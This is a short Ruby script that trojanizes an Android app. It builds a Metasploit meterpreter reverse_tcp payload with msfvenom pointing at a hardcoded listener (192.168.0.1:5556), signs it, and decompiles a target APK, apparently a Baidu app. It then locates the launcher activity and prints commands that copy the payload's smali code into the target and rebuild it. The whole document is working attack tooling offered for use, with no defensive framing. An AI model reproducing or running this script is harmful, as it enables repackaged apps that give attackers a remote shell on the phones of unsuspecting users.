#!/usr/bin/env ruby

require 'nokogiri'

apkfile = ARGV[0]
unless(apkfile && File.readable?(apkfile))
    puts "Usage: #{$0} /apk/to/backdoor.apk"
    exit(1)
end

apktool = `which apktool`
unless(apktool && apktool.length > 0)
    puts "No apktool"
    exit(1)
end

`./msfvenom -f raw -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=5556 > android.apk`

`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android android.apk androiddebugkey`

`rm -rf baidu`
`rm -rf android`

`apktool d #{apkfile}`
`apktool d android.apk`

f = File.open("baidu/AndroidManifest.xml")
amanifest = Nokogiri::XML(f)
f.close

def findlauncheractivity(amanifest)
    activities = amanifest.xpath("//activity")
    for activity in activities 
        activityname =  activity.attribute("name")
        category = activity.search('category')
        if category
            for cat in category
                categoryname = cat.attribute('name')
                if categoryname.to_s == 'android.intent.category.LAUNCHER'
                    return activityname
                end
            end
        end
    end
end

launcheractivity = findlauncheractivity(amanifest)

puts launcheractivity

print 'mkdir -p baidu/smali/com/metasploit/stage/' + "\n"
print 'cp android/smali/com/metasploit/stage/Payload.smali baidu/smali/com/metasploit/stage/' + "\n"
print 'apktool b -o baiduout.apk baidu ' + "\n"

